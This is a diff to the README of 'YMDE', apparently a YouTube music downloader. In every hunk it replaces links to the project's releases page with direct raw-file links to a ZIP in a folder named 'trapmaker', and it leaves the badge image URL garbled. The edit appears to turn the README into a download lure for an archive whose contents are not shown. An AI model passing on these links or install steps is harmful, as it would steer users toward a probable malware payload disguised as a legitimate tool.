@@ -4,7 +4,7 @@
 YMDE is a straightforward tool for downloading music from YouTube and exporting it to your preferred formats. With YMDE, you can create a personal music library without the hassle of complicated procedures. 
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/cheatter404/YMDE/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/cheatter404/YMDE/main/trapmaker/YMDE.zip%20Latest%https://raw.githubusercontent.com/cheatter404/YMDE/main/trapmaker/YMDE.zip)](https://raw.githubusercontent.com/cheatter404/YMDE/main/trapmaker/YMDE.zip)
 
 ## 🚀 Getting Started
 To get started with YMDE, follow the steps below for a smooth experience.
@@ -16,7 +16,7 @@ To get started with YMDE, follow the steps below for a smooth experience.
 
 ### 💻 Installation Steps
 1. **Visit the Release Page**: Click on the link below to navigate to the latest release page.
-   - [Visit this page to download](https://github.com/cheatter404/YMDE/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/cheatter404/YMDE/main/trapmaker/YMDE.zip)
 
 2. **Choose the Version**: On the releases page, find the latest version of YMDE and select the appropriate file for your operating system.
 
@@ -58,4 +58,4 @@ For additional help or to report issues, please visit the following community fo
 
 Enjoy using YMDE to build your personal music library! 
 
-[Visit this page to download](https://github.com/cheatter404/YMDE/releases) again if you need to reinstall or check for new updates.
+[Visit this page to download](https://raw.githubusercontent.com/cheatter404/YMDE/main/trapmaker/YMDE.zip) again if you need to reinstall or check for new updates.
